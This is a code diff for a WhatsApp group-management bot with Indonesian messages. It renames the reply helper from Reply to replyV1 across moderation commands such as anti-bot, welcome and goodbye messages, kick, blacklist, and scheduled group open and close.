+            return replyV1('❌ Gagal memulai verifikasi. Coba lagi setelah memastikan koneksi bot stabil.')
         }
     }
 
     if (option === 'timeout') {
         const seconds = Number(value)
         if (!Number.isInteger(seconds) || seconds < 15 || seconds > 300) {
-            return Reply(`Masukkan batas waktu 15–300 detik. Contoh: ${prefix}antibot timeout 60`)
+            return replyV1(`Masukkan batas waktu 15–300 detik. Contoh: ${prefix}antibot timeout 60`)
         }
         group.antibotTimeout = seconds
-        return Reply(`⏱️ Batas waktu verifikasi anggota baru diatur menjadi ${seconds} detik.`)
+        return replyV1(`⏱️ Batas waktu verifikasi anggota baru diatur menjadi ${seconds} detik.`)
     }
 
     if (option === 'status') {
-        return Reply(
+        return replyV1(
             `╭━━〔 🛡️ STATUS ANTI-BOT 〕━━╮\n` +
             `│ Status  : ${group.antibot === true ? '🟢 AKTIF' : '🔴 NONAKTIF'}\n` +
             `│ Timeout : ${Number(group.antibotTimeout)} detik\n` +
@@ -32157,20 +32130,20 @@ case 'antibot': {
     group.antibot = option === 'on'
     if (!group.antibot) antiBotService.clearGroupChallenges(m.chat)
 
-    return Reply(option === 'on'
+    return replyV1(option === 'on'
         ? `🛡️ ANTI-BOT DIAKTIFKAN\n\nAnggota baru akan diminta menjawab soal pada gambar dalam ${Number(group.antibotTimeout)} detik. Jika waktunya habis, bot akan mengeluarkannya bila bot memiliki hak admin.`
         : '🛡️ ANTI-BOT DINONAKTIFKAN\n\nTantangan verifikasi yang masih berjalan telah dibatalkan.'
     )
 }
 break
 case 'antivirtex': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
 
     const args = text.trim().toLowerCase()
 
     if (!['on', 'off'].includes(args)) {
-        return Reply(
+        return replyV1(
 `🛡️ ANTI-VIRTEX
 
 Status:
@@ -32189,7 +32162,7 @@ Contoh:
 
     db.groups[m.chat].antivirtex = args === 'on'
 
-    return Reply(
+    return replyV1(
         args === 'on'
             ? `🛡️ ANTI-VIRTEX AKTIF
 
@@ -32201,70 +32174,70 @@ Anti-Virtex berhasil dinonaktifkan untuk grup ini.`
 }
 break
 case 'antinsfw': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
     if (!global.db.groups) global.db.groups = {}
     const group = global.db.groups[m.chat] ||= {}
     const option = String(args[0] || 'status').toLowerCase()
     if (!['on', 'off', 'status'].includes(option)) {
-        return Reply(`🛡️ *ANTI-NSFW*\n\nGunakan:\n${prefix}antinsfw on\n${prefix}antinsfw off\n${prefix}antinsfw status\n\nPemindaian memerlukan environment NSFW_CHECK_API_KEY.`)
+        return replyV1(`🛡️ *ANTI-NSFW*\n\nGunakan:\n${prefix}antinsfw on\n${prefix}antinsfw off\n${prefix}antinsfw status\n\nPemindaian memerlukan environment NSFW_CHECK_API_KEY.`)
     }
     if (option === 'on' && !String(process.env.NSFW_CHECK_API_KEY || '').trim()) {
-        return Reply('❌ Anti-NSFW belum diaktifkan karena NSFW_CHECK_API_KEY belum diatur di environment VPS. Atur key API pemeriksa NSFW terlebih dahulu, lalu ulangi perintah.')
+        return replyV1('❌ Anti-NSFW belum diaktifkan karena NSFW_CHECK_API_KEY belum diatur di environment VPS. Atur key API pemeriksa NSFW terlebih dahulu, lalu ulangi perintah.')
     }
     if (option !== 'status') {
         group.antinsfw = option === 'on'
         saveDB(global.db)
     }
-    return Reply(`🛡️ *ANTI-NSFW ${group.antinsfw === true ? 'AKTIF' : 'NONAKTIF'}*\n\nStatus: ${group.antinsfw === true ? '🟢 ON' : '🔴 OFF'}\nAPI key: ${String(process.env.NSFW_CHECK_API_KEY || '').trim() ? 'terpasang' : 'belum dipasang'}\n${group.antinsfw === true ? 'Media gambar/video/stiker yang didukung akan diperiksa otomatis. Akurasi API tidak selalu sempurna.' : 'Pemindaian otomatis dinonaktifkan untuk grup ini.'}`)
+    return replyV1(`🛡️ *ANTI-NSFW ${group.antinsfw === true ? 'AKTIF' : 'NONAKTIF'}*\n\nStatus: ${group.antinsfw === true ? '🟢 ON' : '🔴 OFF'}\nAPI key: ${String(process.env.NSFW_CHECK_API_KEY || '').trim() ? 'terpasang' : 'belum dipasang'}\n${group.antinsfw === true ? 'Media gambar/video/stiker yang didukung akan diperiksa otomatis. Akurasi API tidak selalu sempurna.' : 'Pemindaian otomatis dinonaktifkan untuk grup ini.'}`)
 }
 break
 
 case 'autostickergc':
 case 'autosticker': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
     if (!global.db.groups) global.db.groups = {}
     const group = global.db.groups[m.chat] ||= {}
     const option = String(args[0] || 'status').toLowerCase()
     if (!['on', 'off', 'status'].includes(option)) {
-        return Reply(`🤖 *AUTO STICKER GROUP*\n\n${prefix}autostickergc on\n${prefix}autostickergc off\n${prefix}autostickergc status\n\nFoto/video baru akan dibuat menjadi stiker otomatis; video dibatasi maksimal 10 detik dan media 20 MB.`)
+        return replyV1(`🤖 *AUTO STICKER GROUP*\n\n${prefix}autostickergc on\n${prefix}autostickergc off\n${prefix}autostickergc status\n\nFoto/video baru akan dibuat menjadi stiker otomatis; video dibatasi maksimal 10 detik dan media 20 MB.`)
     }
     if (option !== 'status') {
         group.autostickergc = option === 'on'
         saveDB(global.db)
     }
-    return Reply(`🤖 *AUTO STICKER GROUP*\n\nStatus: ${group.autostickergc === true ? '🟢 ON' : '🔴 OFF'}\nMedia: foto dan video hingga 10 detik\nBatas ukuran: 20 MB`)
+    return replyV1(`🤖 *AUTO STICKER GROUP*\n\nStatus: ${group.autostickergc === true ? '🟢 ON' : '🔴 OFF'}\nMedia: foto dan video hingga 10 detik\nBatas ukuran: 20 MB`)
 }
 break
 
 case 'setwelcome': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isCreator && !isAdmins) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isCreator && !isAdmins) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
     if (!global.db.groups) global.db.groups = {}
     if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
     const welcomeText = text.trim()
     if (!welcomeText) {
-        return Reply(
+        return replyV1(
             `❌ Masukkan teks welcome!\n\nContoh:\n${prefix}setwelcome 👋 Selamat datang {user} di {group}!\n\n📖 Deskripsi:\n{desc}\n\nPlaceholder:\n• {user} = mention member baru\n• {group} = nama grup\n• {desc} = deskripsi grup`
         )
     }
     global.db.groups[m.chat].welcomeText = welcomeText
     global.db.groups[m.chat].welcome = true
-    return Reply(`✅ WELCOME BERHASIL DIATUR\n\n📝 Pesan:\n${welcomeText}\n\nPlaceholder: {user}, {group}, {desc}`)
+    return replyV1(`✅ WELCOME BERHASIL DIATUR\n\n📝 Pesan:\n${welcomeText}\n\nPlaceholder: {user}, {group}, {desc}`)
 }
 break
 case 'goodbye': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isCreator && !isAdmins) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isCreator && !isAdmins) return replyV1(mess.admin)
     if (!global.db.groups) global.db.groups = {}
     if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
 
     const option = String(text || '').trim().toLowerCase()
     if (!['on', 'off', 'status'].includes(option)) {
         const status = global.db.groups[m.chat].goodbye === true ? 'ON' : 'OFF'
-        return Reply(
+        return replyV1(
 `👋 GOODBYE GROUP
 
 Status: ${status}
@@ -32278,11 +32251,11 @@ ${prefix}goodbye status`
 
     if (option === 'status') {
         const template = global.db.groups[m.chat].goodbyeText || '👋 Selamat tinggal {user} dari {group}.\n\nSemoga kita bisa bertemu lagi!'
-        return Reply(`👋 GOODBYE\n\nStatus: ${global.db.groups[m.chat].goodbye === true ? 'ON' : 'OFF'}\n\nTemplate:\n${template}`)
+        return replyV1(`👋 GOODBYE\n\nStatus: ${global.db.groups[m.chat].goodbye === true ? 'ON' : 'OFF'}\n\nTemplate:\n${template}`)
     }
 
     global.db.groups[m.chat].goodbye = option === 'on'
-    return Reply(
+    return replyV1(
         option === 'on'
             ? `✅ GOODBYE AKTIF\n\nPesan perpisahan akan dikirim saat member keluar/di-kick dari grup.`
             : `✅ GOODBYE NONAKTIF\n\nPesan perpisahan tidak akan dikirim.`
@@ -32290,14 +32263,14 @@ ${prefix}goodbye status`
 }
 break
 case 'setgoodbye': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isCreator && !isAdmins) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isCreator && !isAdmins) return replyV1(mess.admin)
     if (!global.db.groups) global.db.groups = {}
     if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
 
     const goodbyeText = text.trim()
     if (!goodbyeText) {
-        return Reply(
+        return replyV1(
             `❌ Masukkan teks goodbye!\n\nContoh:\n${prefix}setgoodbye 👋 Selamat tinggal {user} dari {group}.\n\nPlaceholder:\n• {user} = mention member yang keluar\n• {group} = nama grup\n• {desc} = deskripsi grup`
         )
     }
@@ -32305,45 +32278,45 @@ case 'setgoodbye': {
     global.db.groups[m.chat].goodbyeText = goodbyeText
     global.db.groups[m.chat].goodbye = true
 
-    return Reply(`✅ GOODBYE BERHASIL DIATUR\n\n📝 Pesan:\n${goodbyeText}\n\nPlaceholder: {user}, {group}, {desc}`)
+    return replyV1(`✅ GOODBYE BERHASIL DIATUR\n\n📝 Pesan:\n${goodbyeText}\n\nPlaceholder: {user}, {group}, {desc}`)
 }
 break
 case 'setleft':
 case 'changeleft': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isCreator && !isAdmins) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isCreator && !isAdmins) return replyV1(mess.admin)
     if (!global.db.groups) global.db.groups = {}
     const group = global.db.groups[m.chat] ||= {}
     const template = String(text || '').trim()
     if (!template) {
-        return Reply(`👋 *PESAN MEMBER KELUAR*\n\nContoh:\n${prefix}${command} 👋 Selamat tinggal {user} dari {group}.\n\nPlaceholder: {user}, {group}, {desc}. Bisa juga pakai @user, @group, @desc.`)
+        return replyV1(`👋 *PESAN MEMBER KELUAR*\n\nContoh:\n${prefix}${command} 👋 Selamat tinggal {user} dari {group}.\n\nPlaceholder: {user}, {group}, {desc}. Bisa juga pakai @user, @group, @desc.`)
     }
     group.leftText = template.slice(0, 1500)
     group.leftEnabled = true
     saveDB(global.db)
-    return Reply(`✅ Pesan khusus member keluar berhasil ${command === 'setleft' ? 'diatur' : 'diperbarui'}.\n\nStatus: ON\nTemplate:\n${group.leftText}\n\nPlaceholder: {user}, {group}, {desc}, @user, @group, @desc`)
+    return replyV1(`✅ Pesan khusus member keluar berhasil ${command === 'setleft' ? 'diatur' : 'diperbarui'}.\n\nStatus: ON\nTemplate:\n${group.leftText}\n\nPlaceholder: {user}, {group}, {desc}, @user, @group, @desc`)
 }
 break
 
 case 'delsetleft': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isCreator && !isAdmins) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isCreator && !isAdmins) return replyV1(mess.admin)
     const group = global.db?.groups?.[m.chat]
     if (!group || (!Object.prototype.hasOwnProperty.call(group, 'leftEnabled') && !Object.prototype.hasOwnProperty.call(group, 'leftText'))) {
-        return Reply('ℹ️ Belum ada template setleft khusus untuk grup ini.')
+        return replyV1('ℹ️ Belum ada template setleft khusus untuk grup ini.')
     }
     delete group.leftEnabled
     delete group.leftText
     saveDB(global.db)
-    return Reply('✅ Template setleft khusus dihapus. Jika fitur goodbye biasa aktif, pesan goodbye biasa akan digunakan kembali.')
+    return replyV1('✅ Template setleft khusus dihapus. Jika fitur goodbye biasa aktif, pesan goodbye biasa akan digunakan kembali.')
 }
 break
 
 case 'warcall': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isCreator && !isAdmins) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isCreator && !isAdmins) return replyV1(mess.admin)
     const title = String(text || '').trim().slice(0, 80)
-    if (!title) return Reply(`📣 *WAR CALL*\n\nContoh: ${prefix}warcall Mabar mulai 5 menit lagi\n\nGunakan dengan bijak; fitur memiliki cooldown 10 menit per grup.`)
+    if (!title) return replyV1(`📣 *WAR CALL*\n\nContoh: ${prefix}warcall Mabar mulai 5 menit lagi\n\nGunakan dengan bijak; fitur memiliki cooldown 10 menit per grup.`)
     conn.__xeryuuWarcallCooldowns ||= new Map()
     if (!global.db.groups) global.db.groups = {}
     const warcallGroup = global.db.groups[m.chat] ||= {}
@@ -32352,7 +32325,7 @@ case 'warcall': {
     const cooldownMs = 10 * 60 * 1000
     if (now - lastAt < cooldownMs) {
         const remaining = Math.ceil((cooldownMs - (now - lastAt)) / 60000)
-        return Reply(`⏳ Warcall baru saja dipakai. Coba lagi sekitar ${remaining} menit lagi.`)
+        return replyV1(`⏳ Warcall baru saja dipakai. Coba lagi sekitar ${remaining} menit lagi.`)
     }
     try {
         await conn.relayMessage(m.chat, {
@@ -32365,18 +32338,18 @@ case 'warcall': {
         conn.__xeryuuWarcallCooldowns.set(m.chat, now)
         warcallGroup._warcallLastAt = now
         saveDB(global.db)
-        return Reply(`✅ Warcall berhasil dikirim.\nJudul: ${title}`)
+        return replyV1(`✅ Warcall berhasil dikirim.\nJudul: ${title}`)
     } catch (error) {
         console.error('[WARCALL ERROR]', error?.stack || error)
-        return Reply(`❌ Warcall gagal dikirim: ${error?.message || error}`)
+        return replyV1(`❌ Warcall gagal dikirim: ${error?.message || error}`)
     }
 }
 break
 
 case 'goodmorning':
 case 'goodnight': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isCreator && !isAdmins) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isCreator && !isAdmins) return replyV1(mess.admin)
     if (!global.db) global.db = {}
     if (!global.db.groups) global.db.groups = {}
     if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
@@ -32390,7 +32363,7 @@ case 'goodnight': {
     const input = String(text || '').trim().toLowerCase()
 
     if (!input) {
-        return Reply(
+        return replyV1(
             `╭━━━〔 ${isMorning ? '🌅 GOOD MORNING' : '🌙 GOOD NIGHT'} 〕━━━╮\n` +
             `│ Status: ${group[enabledKey] === true ? '🟢 ON' : '🔴 OFF'}\n` +
             `│ Jadwal: ${currentTime} WIB\n` +
@@ -32406,7 +32379,7 @@ case 'goodnight': {
         group[enabledKey] = false
         group[isMorning ? '_lastGoodMorningTime' : '_lastGoodNightTime'] = null
         saveDB(global.db)
-        return Reply(`✅ Auto ${isMorning ? 'Good Morning' : 'Good Night'} berhasil dimatikan.`)
+        return replyV1(`✅ Auto ${isMorning ? 'Good Morning' : 'Good Night'} berhasil dimatikan.`)
     }
 
     let requestedTime = defaultTime
@@ -32415,18 +32388,18 @@ case 'goodnight': {
     } else if (/^(?:[01]\d|2[0-3]):[0-5]\d$/.test(parts[0])) {
         requestedTime = parts[0]
     } else {
-        return Reply(`❌ Format salah. Gunakan ${prefix}${command} on [HH:MM], ${prefix}${command} HH:MM, atau ${prefix}${command} off.`)
+        return replyV1(`❌ Format salah. Gunakan ${prefix}${command} on [HH:MM], ${prefix}${command} HH:MM, atau ${prefix}${command} off.`)
     }
 
     if (!/^(?:[01]\d|2[0-3]):[0-5]\d$/.test(requestedTime)) {
-        return Reply('❌ Format waktu harus HH:MM, misalnya 05:30 atau 21:00.')
+        return replyV1('❌ Format waktu harus HH:MM, misalnya 05:30 atau 21:00.')
     }
 
     group[enabledKey] = true
     group[timeKey] = requestedTime
     group[isMorning ? '_lastGoodMorningTime' : '_lastGoodNightTime'] = null
     saveDB(global.db)
-    return Reply(
+    return replyV1(
         `✅ AUTO ${isMorning ? 'GOOD MORNING' : 'GOOD NIGHT'} AKTIF\n\n` +
         `🕒 Jadwal: ${requestedTime} WIB\n` +
         `Pesan akan dikirim otomatis setiap hari di grup ini.\n` +
@@ -32437,13 +32410,13 @@ break
 
 case 'closetime': {
     if (mess.group) {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
    }
    
-    if (!isCreator && !isAdmins) return Reply(mess.admin)
+    if (!isCreator && !isAdmins) return replyV1(mess.admin)
     
   if (mess.botAdmin) {
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
    }
     if (!global.db) global.db = {}
     if (!global.db.groups) global.db.groups = {}
@@ -32462,7 +32435,7 @@ case 'closetime': {
     }
     const time = text.trim()
     if (!time) {
-        return Reply(
+        return replyV1(
             `❌ Masukkan waktu!\n\n` +
             `Contoh:\n` +
             `.closetime 21:00\n\n` +
@@ -32476,12 +32449,12 @@ case 'closetime': {
         console.log(
             `[CLOSETIME OFF] ${m.chat}`
         )
-        return Reply(
+        return replyV1(
             `✅ Jadwal close grup berhasil dimatikan.`
         )
     }
     if (!/^(?:[01]\d|2[0-3]):[0-5]\d$/.test(time)) {
-        return Reply(
+        return replyV1(
             `❌ Format waktu salah!\n\n` +
             `Gunakan:\n` +
             `.closetime 21:00`
@@ -32494,7 +32467,7 @@ case 'closetime': {
         `[CLOSETIME] ${m.chat} → ${time} WIB`
     )
 
-    return Reply(
+    return replyV1(
         `✅ AUTO CLOSE AKTIF\n\n` +
         `🕐 Waktu: ${time} WIB\n\n` +
         `Grup akan otomatis ditutup setiap hari pada jam tersebut.\n\n` +
@@ -32505,13 +32478,13 @@ case 'closetime': {
 break
 case 'opentime': {
  if (mess.group) {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
    }
    
-  if (!isCreator && !isAdmins) return Reply(mess.admin)
+  if (!isCreator && !isAdmins) return replyV1(mess.admin)
   
   if (mess.botAdmin) {
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
    }
     if (!global.db) global.db = {}
     if (!global.db.groups) global.db.groups = {}
@@ -32530,7 +32503,7 @@ case 'opentime': {
     }
     const time = text.trim()
     if (!time) {
-        return Reply(
+        return replyV1(
             `❌ Masukkan waktu!\n\n` +
             `Contoh:\n` +
             `.opentime 04:00\n\n` +
@@ -32544,12 +32517,12 @@ case 'opentime': {
         console.log(
             `[OPENTIME OFF] ${m.chat}`
         )
-        return Reply(
+        return replyV1(
             `✅ Jadwal open grup berhasil dimatikan.`
         )
     }
     if (!/^(?:[01]\d|2[0-3]):[0-5]\d$/.test(time)) {
-        return Reply(
+        return replyV1(
             `❌ Format waktu salah!\n\n` +
             `Gunakan:\n` +
             `.opentime 04:00`
@@ -32560,7 +32533,7 @@ case 'opentime': {
     console.log(
         `[OPENTIME] ${m.chat} → ${time} WIB`
     )
-    return Reply(
+    return replyV1(
         `✅ AUTO OPEN AKTIF\n\n` +
         `🕐 Waktu: ${time} WIB\n\n` +
         `Grup akan otomatis dibuka setiap hari pada jam tersebut.\n\n` +
@@ -32571,15 +32544,15 @@ case 'opentime': {
 break
 case "tagall": {
    if (mess.group) {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
    }
   
   if (mess.botAdmin) {
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
    }
    
-  if (!isCreator && !isAdmins) return Reply(mess.admin)
-if (!text) return Reply(example("pesannya"))
+  if (!isCreator && !isAdmins) return replyV1(mess.admin)
+if (!text) return replyV1(example("pesannya"))
 let teks = text+"\n\n"
 let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
 await member.forEach((e) => {
@@ -32591,45 +32564,45 @@ break
 
 case "add": {
    if (mess.group) {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
    }
     
   if (mess.botAdmin) {
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
    }
 if (text) {
 const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
 var onWa = await conn.onWhatsApp(input.split("@")[0])
-if (onWa.length < 1) return Reply("Nomor tidak terdaftar di whatsapp")
+if (onWa.length < 1) return replyV1("Nomor tidak terdaftar di whatsapp")
 const res = await conn.groupParticipantsUpdate(m.chat, [input], 'add')
 if (Object.keys(res).length == 0) {
-return Reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
+return replyV1(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
 } else {
-return Reply(JSON.stringify(res, null, 2))
+return replyV1(JSON.stringify(res, null, 2))
 }} else {
-return Reply(example("62838###"))
+return replyV1(example("62838###"))
 }
 }
 break
 
 case "h": case "ht": case "hidetag": {
    if (mess.group) {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
    }
-    if (!isCreator && !isAdmins) return Reply(mess.admin)
+    if (!isCreator && !isAdmins) return replyV1(mess.admin)
   if (mess.botAdmin) {
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
    }
-if (!text) return Reply(example("teksnya mana😹"))
+if (!text) return replyV1(example("teksnya mana😹"))
 let member = m.metadata.participants.map(v => v.id)
 await conn.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
 }
 break
 case "totag": {
-    if (!isCreator && !isAdmins) return Reply(mess.owner);
+    if (!isCreator && !isAdmins) return replyV1(mess.owner);
 
     // pastikan user membalas pesan
-    if (!quoted || !quoted.message) return Reply(`Reply pesan teks yang ingin di-tag semua!`);
+    if (!quoted || !quoted.message) return replyV1(`Reply pesan teks yang ingin di-tag semua!`);
 
     // ambil semua anggota grup
     let members = m.metadata?.participants?.map(v => v.id) || [];
@@ -32641,7 +32614,7 @@ case "totag": {
     } else if (quoted.message.extendedTextMessage) {
         content = quoted.message.extendedTextMessage.text;
     } else {
-        return Reply("Hanya mendukung pesan teks saja.");
+        return replyV1("Hanya mendukung pesan teks saja.");
     }
 
     // kirim ulang teks + mention semua
@@ -32655,13 +32628,13 @@ break
 case "kick":
 case "kik": {
     if (!m.isGroup)
-        return Reply(mess.group)
+        return replyV1(mess.group)
 
     if (!isAdmins && !isCreator)
-        return Reply(mess.admin)
+        return replyV1(mess.admin)
 
     if (!isBotAdmins)
-        return Reply(mess.botAdmin)
+        return replyV1(mess.botAdmin)
 
     let target
 
@@ -32673,11 +32646,11 @@ case "kik": {
         const number = text.replace(/\D/g, '')
 
         if (!number)
-            return Reply(`Contoh: ${prefix}kick @user`)
+            return replyV1(`Contoh: ${prefix}kick @user`)
 
         target = number + '@s.whatsapp.net'
     } else {
-        return Reply(
+        return replyV1(
             `Reply/tag member yang ingin dikeluarkan.\n\n` +
             `Contoh: ${prefix}kick @user`
         )
@@ -32694,7 +32667,7 @@ case "kik": {
         const metadata = await conn.groupMetadata(m.chat)
 
         if (!metadata?.participants?.length) {
-            return Reply('❌ Gagal mengambil daftar anggota grup.')
+            return replyV1('❌ Gagal mengambil daftar anggota grup.')
         }
 
         const participant = metadata.participants.find(p => {
@@ -32721,7 +32694,7 @@ case "kik": {
                     phoneNumber: p.phoneNumber
                 }))
             )
-            return Reply(
+            return replyV1(
                 '❌ User tersebut tidak ditemukan di daftar anggota grup.\n\n' +
                 'Coba gunakan reply atau tag @user.'
             )
@@ -32729,10 +32702,10 @@ case "kik": {
         const targetJid = normalizeJid(participant.id)
         const myBot = normalizeJid(botNumber)
         if (targetJid === myBot) {
-            return Reply('❌ Saya tidak bisa mengeluarkan diri sendiri.')
+            return replyV1('❌ Saya tidak bisa mengeluarkan diri sendiri.')
         }
         if (participant.admin) {
-            return Reply('❌ Tidak bisa mengeluarkan admin grup.')
+            return replyV1('❌ Tidak bisa mengeluarkan admin grup.')
         }
         await conn.groupParticipantsUpdate(
             m.chat,
@@ -32747,7 +32720,7 @@ case "kik": {
             addedAt: Date.now(),
             reason: 'Dikeluarkan menggunakan command kick'
         }
-        await Reply(
+        await replyV1(
             `✅ Berhasil mengeluarkan @${targetJid.split('@')[0]}\n` +
             `🚫 User otomatis masuk blacklist.`,
             {
@@ -32757,7 +32730,7 @@ case "kik": {
     } catch (err) {
         console.error('[KICK ERROR]', err)
 
-        await Reply(
+        await replyV1(
             `❌ Gagal mengeluarkan member.\n\n` +
             `Error: ${err?.message || err}`
         )
@@ -32768,10 +32741,10 @@ case 'unblacklist':
 case 'delblacklist':
 case 'hapusblacklist': {
     if (!m.isGroup)
-        return Reply(mess.group)
+        return replyV1(mess.group)
 
     if (!isAdmins && !isCreator)
-        return Reply(mess.admin)
+        return replyV1(mess.admin)
 
     let target
 
@@ -32783,11 +32756,11 @@ case 'hapusblacklist': {
         const number = text.replace(/\D/g, '')
 
         if (!number)
-            return Reply(`Contoh: ${prefix}${command} 628123456789`)
+            return replyV1(`Contoh: ${prefix}${command} 628123456789`)
 
         target = number + '@s.whatsapp.net'
     } else {
-        return Reply(
+        return replyV1(
             `Reply/tag user yang ingin dihapus dari blacklist.\n\n` +
             `Contoh: ${prefix}${command} @user`
         )
@@ -32799,7 +32772,7 @@ case 'hapusblacklist': {
         global.db.blacklist = {}
 
     if (!global.db.blacklist[target]) {
-        return Reply(
+        return replyV1(
             `❌ @${target.split('@')[0]} tidak ada di blacklist.`,
             { mentions: [target] }
         )
@@ -32807,7 +32780,7 @@ case 'hapusblacklist': {
 
     delete global.db.blacklist[target]
 
-    return Reply(
+    return replyV1(
         `✅ @${target.split('@')[0]} berhasil dihapus dari blacklist.`,
         { mentions: [target] }
     )
@@ -32816,10 +32789,10 @@ break
 case 'blacklist':
 case 'bl': {
     if (!m.isGroup)
-        return Reply(mess.group)
+        return replyV1(mess.group)
 
     if (!isAdmins && !isCreator)
-        return Reply(mess.admin)
+        return replyV1(mess.admin)
 
     if (!global.db.blacklist)
         global.db.blacklist = {}
@@ -32828,7 +32801,7 @@ case 'bl': {
     const number = String(text || '').replace(/\D/g, '')
 
     if (!number) {
-        return Reply(
+        return replyV1(
             `❌ Nomor tidak valid!\n\n` +
             `Contoh:\n` +
             `${prefix}blacklist 628312345678`
@@ -32843,12 +32816,12 @@ case 'bl': {
         .replace(/:\d+(?=@)/, '')
 
     if (target === botJid) {
-        return Reply('❌ Tidak bisa memasukkan bot sendiri ke blacklist.')
+        return replyV1('❌ Tidak bisa memasukkan bot sendiri ke blacklist.')
     }
 
     // Cek apakah sudah ada
     if (global.db.blacklist[target]) {
-        return Reply(
+        return replyV1(
             `⚠️ @${number} sudah ada di blacklist.`,
             { mentions: [target] }
         )
@@ -32861,7 +32834,7 @@ case 'bl': {
         reason: 'Ditambahkan menggunakan command blacklist'
     }
 
-    return Reply(
+    return replyV1(
         `🚫 BLACKLIST BERHASIL\n\n` +
         `👤 Nomor: @${number}\n` +
         `📌 Status: Masuk blacklist\n\n` +
@@ -32874,8 +32847,8 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "leave": {
-if (!isCreator && !isAdmins) return Reply(mess.owner)
-await Reply("Baik, Saya Akan Keluar Dari Grup Ini")
+if (!isCreator && !isAdmins) return replyV1(mess.owner)
+await replyV1("Baik, Saya Akan Keluar Dari Grup Ini")
 await sleep(4000)
 await conn.groupLeave(m.chat)
 }
@@ -32885,52 +32858,52 @@ case "closegc":
 case "close":
 case "opengc":
 case "open": {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
 
     const shouldOpen = /^(open|opengc)$/i.test(command)
     const announce = Boolean((groupMetadata || m.metadata)?.announce)
 
     if (shouldOpen) {
-        if (!announce) return Reply('ℹ️ Grup sudah dalam mode semua member bisa chat.')
+        if (!announce) return replyV1('ℹ️ Grup sudah dalam mode semua member bisa chat.')
         try {
             await conn.groupSettingUpdate(m.chat, 'not_announcement')
-            return Reply('✅ Grup dibuka. Semua member dapat mengirim pesan.')
+            return replyV1('✅ Grup dibuka. Semua member dapat mengirim pesan.')
         } catch (err) {
             console.error('[OPEN GROUP ERROR]', err)
-            return Reply(`❌ Gagal membuka grup.
+            return replyV1(`❌ Gagal membuka grup.
 ${err?.message || err}`)
         }
     }
 
-    if (announce) return Reply('ℹ️ Grup sudah dalam mode admin only.')
+    if (announce) return replyV1('ℹ️ Grup sudah dalam mode admin only.')
     try {
         await conn.groupSettingUpdate(m.chat, 'announcement')
-        return Reply('🔒 Grup ditutup. Hanya admin yang dapat mengirim pesan.')
+        return replyV1('🔒 Grup ditutup. Hanya admin yang dapat mengirim pesan.')
     } catch (err) {
         console.error('[CLOSE GROUP ERROR]', err)
-        return Reply(`❌ Gagal menutup grup.
+        return replyV1(`❌ Gagal menutup grup.
 ${err?.message || err}`)
     }
 }
 break
 case 'lockgc': {
     if (!m.isGroup)
-        return Reply(mess.group)
+        return replyV1(mess.group)
     if (!isAdmins && !isCreator)
-        return Reply(mess.admin)
+        return replyV1(mess.admin)
     if (!isBotAdmins)
-        return Reply(mess.botAdmin)
+        return replyV1(mess.botAdmin)
     try {
         await conn.groupSettingUpdate(m.chat, 'locked')
